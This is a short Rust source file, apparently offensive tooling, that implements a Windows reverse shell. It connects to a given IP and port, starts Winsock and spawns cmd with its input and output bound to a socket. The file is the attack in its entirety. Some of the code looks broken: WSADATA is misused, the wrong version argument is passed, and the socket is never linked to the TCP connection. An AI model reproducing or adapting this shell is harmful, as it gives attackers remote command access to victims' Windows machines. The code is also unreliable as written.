// Reverse  shell
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::*;


// https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket/5725609#5725609

// https://stackoverflow.com/questions/50067355/what-methods-do-i-need-to-get-stdio-over-a-tcp-or-udp-stream-on-windows

// Windows based imports
#[cfg(windows)]
extern crate winapi;
#[cfg(windows)]
extern crate ws2_32;

#[cfg(windows)]
use std::os::windows::io::FromRawHandle;

#[cfg(windows)]
pub fn shell(ip: String, port: String) {
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms742212(v=vs.85).aspx
    let PF_INET = winapi::shared::winsock2::PF_INET; // Ipv4
    let IPPROTO_TCP = 6; // TCP-Sock Stream
    let NULL: *mut winapi::winsock2::WSAPROTOCOL_INFOA = ptr::null_mut(); // Setup a null mutable type
    let version: u16 = 22; // Version 2.2 of winsock


    // Mutable data for startup
    let mut data: winapi::winsock2::WSADATA = winapi::winsock2::WSADATA;

    // Start WSA and WinSock2
    unsafe {
        ws2_32::WSAStartup(winapi::um::winsock2::wVersion, &mut data);
    }

    // ET, Phone Home!
    let home = [ip, port].join(":");

    // Unwrap input
    let s = connect(home);

    // Raw Socket for windows
    unsafe {
        let socket = ws2_32::WSASocketA(PF_INET, 1, IPPROTO_TCP, NULL, 0, 0);

        println!("{}", socket);

        let handle: winapi::winnt::HANDLE = socket as winapi::winnt::HANDLE;

        // Open shell
        Command::new("cmd")
            .stdin( Stdio::from_raw_handle(handle))
            .stdout( Stdio::from_raw_handle(handle))
            .stderr( Stdio::from_raw_handle(handle))
            .spawn()
            .unwrap()
            .wait()
            .unwrap();
    }
}

fn connect(home: String) -> TcpStream {
    // Unwrap input
    let s = TcpStream::connect(home).unwrap();
    return s;
}
